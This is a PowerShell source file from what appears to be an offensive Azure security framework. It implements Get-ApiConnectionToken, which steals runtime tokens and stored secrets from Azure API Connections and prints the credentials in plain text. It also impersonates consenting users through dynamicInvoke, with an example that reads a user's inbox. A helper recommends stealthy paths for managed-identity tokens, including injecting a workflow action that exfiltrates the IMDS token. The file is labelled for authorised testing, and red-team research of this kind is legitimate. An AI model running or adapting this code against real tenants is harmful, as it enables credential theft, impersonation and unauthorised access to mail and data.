function Resolve-MiConnectionChain {
    # Internal helper — not exported.
    # Walks: MI connection → Logic Apps → identity type →
    #        role assignments → recommended token path.
    param (
        [string]$ConnectionId,
        [string]$ConnectionName,
        [object]$Sv,
        [hashtable]$Auth
    )

    $connIdLower = $ConnectionId.ToLower()
    $sub         = ($ConnectionId -split '/')[2]
    $report      = [System.Collections.ArrayList]::new()

    # ── 1. Find Logic Apps referencing this connection ──────────────
    $laUri = (
        '{0}/subscriptions/{1}/providers/Microsoft.Logic' +
        '/workflows?api-version=2019-05-01'
    ) -f $Sv.armUri, $sub

    try {
        $allLas = (Invoke-RestMethod `
            -Uri       $laUri `
            -Headers   $Auth `
            -Method    'GET' `
            -UserAgent $Sv.userAgent).value
    }
    catch {
        Write-Verbose "Could not list Logic Apps: $($_.Exception.Message)"
        $allLas = @()
    }

    $linkedLas = @()
    foreach ($la in $allLas) {
        $refs = $la.properties.parameters.`
            '$connections'.value
        if (-not $refs) { continue }
        foreach ($key in $refs.PSObject.Properties.Name) {
            if ($refs.$key.connectionId.ToLower() -eq $connIdLower) {
                $linkedLas += $la
                break
            }
        }
    }

    if ($linkedLas.Count -eq 0) {
        Write-Host (
            '      No Logic Apps reference this connection ' +
            '(orphaned MI connection)'
        ) -ForegroundColor DarkYellow
        return $null
    }

    Write-Host (
        "      Found $($linkedLas.Count) consuming " +
        'Logic App(s)'
    ) -ForegroundColor Cyan

    # ── 2. For each Logic App — extract identity + roles ────────────
    foreach ($la in $linkedLas) {
        $laName = $la.name
        $laId   = $la.id
        $laRg   = ($laId -split '/')[4]
        $laIdentity = $la.identity

        Write-Host "      [$laName]" -ForegroundColor White

        $miType      = $null
        $miPrincipal = $null
        $uamiIds     = @()

        if (-not $laIdentity) {
            Write-Host (
                '        No managed identity assigned'
            ) -ForegroundColor DarkGray
            continue
        }

        $miType = $laIdentity.type  # SystemAssigned | UserAssigned | both

        if ($miType -match 'SystemAssigned') {
            $miPrincipal = $laIdentity.principalId
            Write-Host (
                "        Identity : SystemAssigned" +
                " (principalId: $miPrincipal)"
            ) -ForegroundColor Cyan
        }

        if ($miType -match 'UserAssigned') {
            $uamiIds = $laIdentity.userAssignedIdentities.`
                PSObject.Properties.Name
            foreach ($uamiId in $uamiIds) {
                $clientId = $laIdentity.userAssignedIdentities.`
                    $uamiId.clientId
                Write-Host (
                    "        Identity : UserAssigned" +
                    " — $($uamiId.Split('/')[-1])" +
                    " (clientId: $clientId)"
                ) -ForegroundColor Cyan
            }
        }

        # ── 3. Role assignments for each identity ───────────────────
        $principalIds = @()
        if ($miPrincipal) { $principalIds += $miPrincipal }
        foreach ($uamiId in $uamiIds) {
            $cid = $laIdentity.userAssignedIdentities.`
                $uamiId.principalId
            if ($cid) { $principalIds += $cid }
        }

        $roles = @()
        foreach ($pid in $principalIds) {
            $roleUri = (
                '{0}/subscriptions/{1}/providers/' +
                'Microsoft.Authorization/roleAssignments' +
                '?api-version=2022-04-01' +
                '&$filter=principalId eq ''{2}'''
            ) -f $Sv.armUri, $sub, $pid

            try {
                $assignments = (Invoke-RestMethod `
                    -Uri       $roleUri `
                    -Headers   $Auth `
                    -Method    'GET' `
                    -UserAgent $Sv.userAgent).value

                foreach ($ra in $assignments) {
                    $roleParts = $ra.properties.roleDefinitionId `
                        -split '/'
                    $roleDefId = $roleParts[-1]

                    # Resolve role name
                    $roleNameUri = (
                        '{0}/subscriptions/{1}/providers/' +
                        'Microsoft.Authorization/roleDefinitions/{2}' +
                        '?api-version=2022-04-01'
                    ) -f $Sv.armUri, $sub, $roleDefId

                    $roleName = try {
                        (Invoke-RestMethod `
                            -Uri       $roleNameUri `
                            -Headers   $Auth `
                            -Method    'GET' `
                            -UserAgent $Sv.userAgent).properties.roleName
                    }
                    catch { $roleDefId }

                    $scope = $ra.properties.scope
                    $roles += "$roleName @ $scope"
                    Write-Host (
                        "        Role : $roleName" +
                        " → $scope"
                    ) -ForegroundColor $(
                        if ($roleName -match 'Owner|Contributor|Admin') {
                            'Red'
                        } else { 'Yellow' }
                    )
                }
            }
            catch {
                Write-Verbose (
                    "Could not enumerate roles for " +
                    "$pid`: $($_.Exception.Message)"
                )
            }
        }

        # ── 4. Recommended token path  ───────────────────────────────
        Write-Host '        Token path recommendation:' `
            -ForegroundColor Magenta

        if ($miType -match 'UserAssigned' -and $uamiIds.Count -gt 0) {
            $uamiId = $uamiIds[0]
            Write-Host (
                '          [UAMI] Use Invoke-FederatedTokenExchange' +
                ' (stealthier — no compute, no artifacts):'
            ) -ForegroundColor Green
            Write-Host (
                "          Invoke-FederatedTokenExchange" +
                " -Id '$uamiId'" +
                " -IssuerUrl 'https://<your-oidc-issuer>'" +
                " -EndpointType Azure -Cleanup"
            ) -ForegroundColor White
            Write-Host (
                '          Requires: federatedIdentityCredentials' +
                '/write on the UAMI'
            ) -ForegroundColor DarkGray
            Write-Host (
                '          Alt (noisier): Get-ManagedIdentityToken' +
                " -Id '$uamiId'" +
                " -ResourceGroupName '$laRg'"
            ) -ForegroundColor DarkGray
        }
        elseif ($miType -match 'SystemAssigned' -and $miPrincipal) {
            Write-Host (
                '          [SAI] System-assigned MI — token only' +
                ' obtainable from within the Logic App runtime'
            ) -ForegroundColor Yellow
            Write-Host (
                '          Attack path: inject HTTP action into' +
                ' workflow definition to exfiltrate IMDS token:'
            ) -ForegroundColor Yellow
            $laRgEnc = [Uri]::EscapeDataString($laRg)
            Write-Host (
                "          GET $($Sv.armUri)/subscriptions/$sub/" +
                "resourceGroups/$laRg/providers/Microsoft.Logic/" +
                "workflows/$laName" +
                '?api-version=2019-05-01 → modify definition'
            ) -ForegroundColor White
            Write-Host (
                "          IMDS endpoint (from inside workflow):" +
                ' http://169.254.169.254/metadata/identity/' +
                'oauth2/token?api-version=2018-02-01' +
                '&resource=https://management.azure.com/'
            ) -ForegroundColor DarkGray
        }

        $report.Add([PSCustomObject]@{
            LogicAppName = $laName
            LogicAppId   = $laId
            IdentityType = $miType
            PrincipalIds = $principalIds -join '; '
            UAMIIds      = $uamiIds -join '; '
            RoleAssignments = $roles -join ' | '
        }) | Out-Null
    }

    return $report
}

function Get-ApiConnectionToken {
    [CmdletBinding()]
    param (
        [Parameter(
            Mandatory = $false,
            ValueFromPipelineByPropertyName = $true
        )]
        [Alias('resource-id', 'id')]
        [string]$ConnectionId,

        [Parameter(Mandatory = $false, ValueFromPipelineByPropertyName = $true)]
        [Microsoft.Azure.Commands.ResourceManager.Common.ArgumentCompleters.ResourceGroupCompleterAttribute()]
        [Alias('rg', 'resource-group')]
        [string]$ResourceGroupName,

        [Parameter(Mandatory = $false, ValueFromPipelineByPropertyName = $true)]
        [Microsoft.Azure.Commands.ResourceManager.Common.ArgumentCompleters.ResourceNameCompleterAttribute(
            'Microsoft.Web/connections',
            'ResourceGroupName'
        )]
        [Alias('connection-name', 'connection')]
        [string]$Name,

        [Parameter(Mandatory = $false)]
        [ValidateRange(1, 7)]
        [Alias('validity-days')]
        [int]$ValidityDays = 1,

        # When set on an MI-type connection, enumerates the consuming
        # Logic App's identity, its role assignments, and recommends
        # the least-noisy token path (FIC for UAMI, injection for SAI)
        [Parameter(Mandatory = $false)]
        [Alias('resolve-mi')]
        [switch]$ResolveManagedIdentity,

        [Parameter(Mandatory = $false)]
        [ValidateSet('Object', 'JSON', 'CSV', 'Table')]
        [Alias('output', 'o')]
        [string]$OutputFormat = 'Object'
    )

    begin {
        Write-Verbose "Starting function $($MyInvocation.MyCommand.Name)"
        $MyInvocation.MyCommand.Name | Invoke-BlackCat

        $result = New-Object System.Collections.ArrayList
        $stats  = @{
            StartTime    = Get-Date
            Attempted    = 0
            Succeeded    = 0
            SkippedMI    = 0
            SkippedOAuth = 0
            Failed       = 0
            Unauthorized = 0
        }
    }

    process {
        try {
            # Resolve connection resource IDs to process
            $targets = @()

            if ($ConnectionId) {
                # Caller supplied a full resource ID directly
                $targets += $ConnectionId
            }
            elseif ($ResourceGroupName -and $Name) {
                # Build resource ID from RG + name + current sub
                $subId    = `
                    $script:SessionVariables.subscriptionId
                $targets += (
                    "/subscriptions/$subId/resourceGroups/" +
                    "$ResourceGroupName/providers/" +
                    "Microsoft.Web/connections/$Name"
                )
            }
            else {
                # Enumerate all connections in scope
                Write-Host (
                    ' No specific connection targeted — ' +
                    'enumerating all accessible connections...'
                ) -ForegroundColor Cyan

                $all = Invoke-AzBatch `
                    -ResourceType 'Microsoft.Web/connections'

                if (-not $all -or $all.Count -eq 0) {
                    Write-Host '  No API Connections found' `
                        -ForegroundColor Yellow
                    return
                }

                $targets = $all.id
                Write-Host "  Found $($targets.Count) connection(s)" `
                    -ForegroundColor Cyan
            }

            $stats.Attempted = $targets.Count
            $validityDays    = $ValidityDays

            Write-Host (
                " Requesting runtime token(s) for " +
                "$($targets.Count) connection(s)..."
            ) -ForegroundColor Green

            foreach ($connId in $targets) {
                try {
                    $sv          = $script:SessionVariables
                    $auth        = $script:authHeader
                    # Initialise catch-visible state in case GET fails
                    $isOAuthUser = $false
                    $dynUrl      = $null
                    $storedCreds = $null
                    $credCount   = 0

                    # Step 1: GET connection to retrieve metadata
                    # and the connection runtime URL
                    $getUri = '{0}{1}?api-version=2016-06-01' -f `
                        $sv.armUri, $connId

                    $conn = Invoke-RestMethod `
                        -Uri       $getUri `
                        -Headers   $auth `
                        -Method    'GET' `
                        -UserAgent $sv.userAgent

                    $props           = $conn.properties
                    $connectorId     = $props.api.name
                    $connectorName   = $props.api.displayName
                    $runtimeUrl      = $props.connectionRuntimeUrl
                    $authorizedAs    = $props.authenticatedUser.name
                    $connectionName  = $conn.name

                    # Managed Identity connections (parameterValueType
                    # 'Alternative') have no static keys — they obtain
                    # ARM tokens at runtime via the Logic App's MI.
                    # listConnectionKeys is not supported for these.
                    if ($props.parameterValueType -eq 'Alternative') {
                        Write-Host (
                            "  [~] $connectionName ($connectorId)" +
                            ' — Managed Identity connection'
                        ) -ForegroundColor Yellow

                        $miAnalysis = $null

                        if ($ResolveManagedIdentity) {
                            Write-Host (
                                '      Resolving consuming Logic Apps' +
                                ' and MI identity chain...'
                            ) -ForegroundColor Cyan

                            $miAnalysis = Resolve-MiConnectionChain `
                                -ConnectionId $connId `
                                -ConnectionName $connectionName `
                                -Sv $script:SessionVariables `
                                -Auth $script:authHeader
                        }

                        [void]$result.Add([PSCustomObject]@{
                            'ConnectionName'   = $connectionName
                            'ConnectorId'      = $connectorId
                            'ConnectorDisplay' = $connectorName
                            'AuthorizedAs'     = 'ManagedIdentity'
                            'ConnectionStatus' = (
                                $props.statuses |
                                Select-Object -First 1 `
                                    -ExpandProperty status
                            )
                            'RuntimeUrl'       = $runtimeUrl
                            'Token'            = $null
                            'NotAfter'         = $null
                            'MIAnalysis'       = $miAnalysis
                            'ResourceId'       = $connId
                            'ResourceGroup'    = ($connId -split '/')[4]
                        })
                        $stats.SkippedMI++
                        continue
                    }

                    # Pre-compute flags and the dynamicInvoke URL.
                    # These are available in both the success path and
                    # the catch block below.
                    # OAuth-User connections will throw when
                    # listConnectionKeys is called — expected, because
                    # the refresh token lives in Azure's internal vault.
                    # The catch handler surfaces DynamicInvokeUrl so
                    # Invoke-ConnectorProxy can still act as this user.
                    $isOAuthUser = [bool]$props.authenticatedUser.name
                    $authUser    = $props.authenticatedUser.name
                    $storedCreds = $props.parameterValues
                    $credCount   = if ($storedCreds) {
                        $storedCreds.PSObject.Properties.Name.Count
                    } else { 0 }

                    $dynSub = ($connId -split '/')[2]
                    $dynRg  = ($connId -split '/')[4]
                    $dynUrl = (
                        '{0}/subscriptions/{1}' +
                        '/resourceGroups/{2}' +
                        '/providers/Microsoft.Web' +
                        '/connections/{3}/dynamicInvoke' +
                        '?api-version=2018-07-01-preview'
                    ) -f $sv.armUri, $dynSub, $dynRg, $connectionName

                    # Step 2: POST listConnectionKeys to retrieve
                    # a short-lived JWT for the connection runtime.
                    #
                    # validityTimeSpan must be a .NET TimeSpan string
                    # (d.hh:mm:ss). "1" alone is not a valid TimeSpan
                    # and causes a 400 Bad Request.
                    #
                    # Fallback strategy:
                    #   1. preview API  (2018-07-01-preview) + TimeSpan
                    #   2. stable API   (2016-06-01) + empty body
                    $timespan = '{0}.00:00:00' -f $validityDays
                    $body     = @{
                        validityTimeSpan = $timespan
                    } | ConvertTo-Json -Compress

                    $keysResponse = $null

                    # Attempt 1 — preview API with TimeSpan body
                    $keysUri = (
                        '{0}{1}/listConnectionKeys' +
                        '?api-version=2018-07-01-preview'
                    ) -f $sv.armUri, $connId

                    try {
                        $keysResponse = Invoke-RestMethod `
                            -Uri         $keysUri `
                            -Headers     $auth `
                            -Method      'POST' `
                            -Body        $body `
                            -ContentType 'application/json' `
                            -UserAgent   $sv.userAgent
                    }
                    catch {
                        $previewErr = if ($_.ErrorDetails.Message) {
                            $_.ErrorDetails.Message
                        } else { $_.Exception.Message }

                        Write-Verbose (
                            "preview API failed ($previewErr)" +
                            ' — retrying with stable API'
                        )

                        # Attempt 2 — stable API, same body
                        # (2016-06-01 also requires validityTimeSpan)
                        $keysUri2 = (
                            '{0}{1}/listConnectionKeys' +
                            '?api-version=2016-06-01'
                        ) -f $sv.armUri, $connId

                        $keysResponse = Invoke-RestMethod `
                            -Uri         $keysUri2 `
                            -Headers     $auth `
                            -Method      'POST' `
                            -Body        $body `
                            -ContentType 'application/json' `
                            -UserAgent   $sv.userAgent
                    }

                    # Normalise response across API version variants
                    $token    = if ($keysResponse.value) {
                        $keysResponse.value
                    }
                    elseif ($keysResponse.token.token) {
                        $keysResponse.token.token
                    }
                    elseif ($keysResponse.connectionKey) {
                        $keysResponse.connectionKey
                    }
                    else { $null }

                    $notAfter = if ($keysResponse.notAfter) {
                        $keysResponse.notAfter
                    }
                    elseif ($keysResponse.token.notAfter) {
                        $keysResponse.token.notAfter
                    }
                    else { $null }

                    $item = [PSCustomObject]@{
                        'ConnectionName'    = $connectionName
                        'ConnectorId'       = $connectorId
                        'ConnectorDisplay'  = $connectorName
                        'AuthorizedAs'      = $authorizedAs
                        'ConnectionStatus'  = (
                            $props.statuses |
                            Select-Object -First 1 -ExpandProperty status
                        )
                        'RuntimeUrl'        = $runtimeUrl
                        'Token'             = $token
                        'NotAfter'          = $notAfter
                        'StoredCredentials' = $storedCreds
                        'DynamicInvokeUrl'  = $dynUrl
                        'ResourceId'        = $connId
                        'ResourceGroup'     = ($connId -split '/')[4]
                    }

                    [void]$result.Add($item)
                    $stats.Succeeded++

                    Write-Host (
                        "  [+] $connectionName " +
                        "($connectorId) — token retrieved"
                    ) -ForegroundColor Green

                    if ($credCount -gt 0) {
                        Write-Host (
                            "      Stored credentials found:"
                        ) -ForegroundColor Red
                        foreach ($p in (
                            $storedCreds.PSObject.Properties
                        )) {
                            Write-Host (
                                "        $($p.Name): $($p.Value)"
                            ) -ForegroundColor Red
                        }
                    }

                    if ($runtimeUrl) {
                        Write-Host "      Runtime URL: $runtimeUrl" `
                            -ForegroundColor Cyan
                    }
                }
                catch {
                    # OAuth-User: listConnectionKeys is blocked by
                    # Azure — the refresh token lives in an internal
                    # vault. DynamicInvokeUrl (via Invoke-ConnectorProxy)
                    # proxies connector actions as this user without
                    # needing the raw OAuth token.
                    if ($isOAuthUser) {
                        Write-Host (
                            "  [~] $connectionName ($connectorId)" +
                            " — OAuth-User ($authUser)" +
                            ' — use Invoke-ConnectorProxy'
                        ) -ForegroundColor Yellow

                        if ($credCount -gt 0) {
                            Write-Host (
                                '      Stored credentials in ' +
                                'parameterValues:'
                            ) -ForegroundColor Red
                            foreach ($p in (
                                $storedCreds.PSObject.Properties
                            )) {
                                Write-Host (
                                    "        $($p.Name): $($p.Value)"
                                ) -ForegroundColor Red
                            }
                        }

                        if ($dynUrl) {
                            Write-Host (
                                "      DynamicInvokeUrl: $dynUrl"
                            ) -ForegroundColor Cyan
                        }

                        [void]$result.Add([PSCustomObject]@{
                            'ConnectionName'    = $connectionName
                            'ConnectorId'       = $connectorId
                            'ConnectorDisplay'  = $connectorName
                            'AuthorizedAs'      = $authUser
                            'ConnectionStatus'  = (
                                $props.statuses |
                                Select-Object -First 1 `
                                    -ExpandProperty status
                            )
                            'RuntimeUrl'        = $runtimeUrl
                            'Token'             = $null
                            'NotAfter'          = $null
                            'StoredCredentials' = $storedCreds
                            'DynamicInvokeUrl'  = $dynUrl
                            'ResourceId'        = $connId
                            'ResourceGroup'     = ($connId -split '/')[4]
                        })
                        $stats.SkippedOAuth++
                        continue
                    }

                    $errMsg = $_.Exception.Message
                    # $_.ErrorDetails.Message contains the Azure
                    # error JSON body (more informative than the
                    # HTTP status line alone)
                    $errDetail = if ($_.ErrorDetails.Message) {
                        try {
                            $azErr = $_.ErrorDetails.Message |
                                ConvertFrom-Json -ErrorAction Stop
                            $azErr.error.message ?? $azErr.message ??
                                $_.ErrorDetails.Message
                        }
                        catch { $_.ErrorDetails.Message }
                    }
                    else { $null }

                    $displayMsg = if ($errDetail) {
                        "$errMsg — $errDetail"
                    } else { $errMsg }

                    if ($errMsg -match '401|Unauthorized') {
                        Write-Host (
                            "  [-] $connId — " +
                            "Unauthorized (insufficient RBAC): " +
                            $displayMsg
                        ) -ForegroundColor Red
                        $stats.Unauthorized++
                    }
                    elseif ($errMsg -match '403|Forbidden') {
                        Write-Host (
                            "  [-] $connId — " +
                            "Forbidden (action not allowed): " +
                            $displayMsg
                        ) -ForegroundColor Red
                        $stats.Unauthorized++
                    }
                    else {
                        Write-Warning (
                            "Error on $connId`: $displayMsg"
                        )
                        $stats.Failed++
                    }
                }
            }
        }
        catch {
            Write-Message `
                -FunctionName $($MyInvocation.MyCommand.Name) `
                -Message      $($_.Exception.Message) `
                -Severity     'Error'
        }
    }

    end {
        $duration = (Get-Date) - $stats.StartTime

        Write-Host "`n API Connection Token Summary:" `
            -ForegroundColor Magenta
        Write-Host "   Attempted    : $($stats.Attempted)" `
            -ForegroundColor White
        Write-Host "   Retrieved    : $($stats.Succeeded)" `
            -ForegroundColor Green
        Write-Host "   Unauthorized : $($stats.Unauthorized)" `
            -ForegroundColor Red
        Write-Host "   Errors       : $($stats.Failed)" `
            -ForegroundColor Red
        Write-Host "   Skipped (MI) : $($stats.SkippedMI)" `
            -ForegroundColor Yellow
        Write-Host (
            "   Skipped (OAuth-User): " +
            "$($stats.SkippedOAuth)"
        ) -ForegroundColor Yellow
        Write-Host (
            "   Duration     : " +
            "$($duration.TotalSeconds.ToString('F2'))s"
        ) -ForegroundColor White

        Write-Verbose "Completed function $($MyInvocation.MyCommand.Name)"

        Format-BlackCatOutput `
            -Data         $result `
            -OutputFormat $OutputFormat `
            -FunctionName $MyInvocation.MyCommand.Name
    }

    <#
    .SYNOPSIS
        Retrieves a runtime token for one or more API Connections.

    .DESCRIPTION
        Calls the ARM listConnectionKeys action on Microsoft.Web/connections
        resources to obtain a short-lived JWT that authorises direct
        interaction with the connection runtime service — without needing
        a Logic App to broker the call.

        The returned token and runtime URL can be used to invoke connector
        actions (send mail, query SQL, read blobs, etc.) as the identity
        that originally authorised the connection.

        This demonstrates that API Connections are independently callable
        trust grants, not Logic App-specific credentials.

        AUTHORISED SECURITY TESTING ONLY. Requires:
        - Microsoft.Web/connections/read
        - Microsoft.Web/connections/listConnectionKeys/action
          (typically held by Contributor or Logic App Contributor)

        Usage pattern after token retrieval:
          $headers = @{ Authorization = "Bearer $($token.Token)" }
          Invoke-RestMethod -Uri "$($token.RuntimeUrl)/..." `
              -Headers $headers -Method Post

    .PARAMETER ConnectionId
        Full ARM resource ID of the connection to target. If omitted
        alongside -Name/-ResourceGroupName, all accessible connections
        are processed.

    .PARAMETER ResourceGroupName
        Resource group containing the target connection. Use with -Name.

    .PARAMETER Name
        Name of the target connection resource. Use with -ResourceGroupName.

    .PARAMETER ValidityDays
        Token validity period in days (1–7). Default is 1.

    .PARAMETER ResolveManagedIdentity
        When set, performs deep analysis on MI-type connections:
        finds the Logic App(s) consuming the connection, resolves the
        Logic App identity (system-assigned vs user-assigned), enumerates
        all role assignments of that identity, and prints the recommended
        least-noisy token path:

        - UserAssigned MI → Invoke-FederatedTokenExchange
          (stealthier: no ACI, no deployment script,
           requires federatedIdentityCredentials/write on the UAMI)
        - SystemAssigned MI → workflow injection path
          (inject HTTP action into the LA definition to exfiltrate
           the IMDS token from within the runtime context)

    .PARAMETER OutputFormat
        Output format: Object (default), JSON, CSV, Table.

    .EXAMPLE
        Get-ApiConnectionToken

        Attempts to retrieve runtime tokens for every API Connection
        in the current subscription, showing which ones are accessible
        with the current identity's RBAC permissions.

    .EXAMPLE
        Get-ApiConnectionToken -ResourceGroupName 'rg-int' `
            -Name 'office365-connection'

        Retrieves the runtime token for a specific Office 365 connection.

    .EXAMPLE
        $t = Get-ApiConnection -MinRiskLevel High |
             Select-Object -First 1 |
             Get-ApiConnectionToken
        $headers = @{ Authorization = "Bearer $($t.Token)" }
        Invoke-RestMethod -Uri "$($t.RuntimeUrl)/..." `
            -Headers $headers -Method Post

        Chains Get-ApiConnection discovery into token retrieval, then
        uses the token to call the connection runtime directly.

    .EXAMPLE
        Get-ApiConnectionToken -ConnectionId '/subscriptions/.../' `
            -ResolveManagedIdentity

        For an MI-type connection: resolves the consuming Logic App,
        extracts its identity type and role assignments, and prints
        the recommended token path (FIC exchange for UAMI, or
        workflow injection guidance for system-assigned MI).

    .EXAMPLE
        Get-ApiConnectionToken -OutputFormat JSON

        Exports all retrievable token metadata to a timestamped JSON file.

    .EXAMPLE
        # OAuth-User connections (e.g. office365, sharepointonline,
        # teams) store the OAuth refresh token in Azure's internal
        # Logic Apps token vault. It is NOT accessible via any ARM
        # API — parameterValues will be empty for these connectors.
        #
        # API Key and Basic Auth connections DO store their credential
        # in parameterValues — readable from the GET response.
        #
        # For OAuth-User: Get-ApiConnectionToken surfaces the
        # dynamicInvoke URL, which lets you proxy connector API calls
        # *as the consented user* (requires Join/action on the
        # connection — held by Contributor and above):

        $conn = Get-ApiConnectionToken -Name 'office365' `
            -ResourceGroupName 'azh-development'

        # StoredCredentials will be empty for pure OAuth connections.
        # For API Key/Basic Auth connections it will hold the secret:
        $conn.StoredCredentials

        # To act as the OAuth user without the token, use ARM as
        # the caller identity and proxy through dynamicInvoke:
        $armToken = (Get-AzAccessToken `
            -ResourceUrl 'https://management.azure.com/').Token
        Write-Host "ARM caller token: $armToken"

        $authHeader = @{ Authorization = "Bearer $armToken" }

        # List the inbox of the consented user (office365 connector
        # path — see connector swagger for available paths):
        $body = @{
            method  = 'get'
            path    = '/v2/Mail'
            queries = @{ fetchOnlyUnread = $false; top = 10 }
        } | ConvertTo-Json -Depth 5

        Invoke-RestMethod `
            -Uri         $conn.DynamicInvokeUrl `
            -Method      POST `
            -Headers     $authHeader `
            -Body        $body `
            -ContentType 'application/json'

        # Azure proxies the call using the stored OAuth token on
        # behalf of the authorised user — the OAuth refresh token
        # itself remains in Azure's vault and is never exposed.

        [PSCustomObject]
        Each object contains:
        - ConnectionName: Resource name of the connection
        - ConnectorId: API name (e.g. "office365", "sql")
        - ConnectorDisplay: Human-readable connector name
        - AuthorizedAs: Identity that originally consented
        - ConnectionStatus: Connected | Error | Unauthenticated
        - RuntimeUrl: Connection runtime URL (call target)
        - Token: Short-lived JWT (null for MI/OAuth-User connections)
        - NotAfter: Token expiry (ISO 8601)
        - StoredCredentials: Contents of parameterValues from ARM;
          populated for API Key and Basic Auth connections;
          empty for OAuth-User (token held in Azure vault)
        - DynamicInvokeUrl: ARM proxy endpoint for OAuth-User
          connections (present only for OAuth-User type)
        - MIAnalysis: Chain analysis report (present only with
          -ResolveManagedIdentity on MI connections)
        - ResourceId: Full ARM resource ID
        - ResourceGroup: Containing resource group

    .NOTES
        Author: BlackCat Security Framework
        Requires: ARM access (Az.Accounts)

        Required RBAC actions:
        - Microsoft.Web/connections/read
        - Microsoft.Web/connections/listConnectionKeys/action

        The listConnectionKeys action is included in:
        - Contributor
        - Logic App Contributor
        - Any role with Microsoft.Web/connections/* actions

    .LINK
        MITRE ATT&CK Tactic: TA0006 - Credential Access
        https://attack.mitre.org/tactics/TA0006/

    .LINK
        MITRE ATT&CK Technique: T1528 - Steal Application Access Token
        https://attack.mitre.org/techniques/T1528/
    #>
}
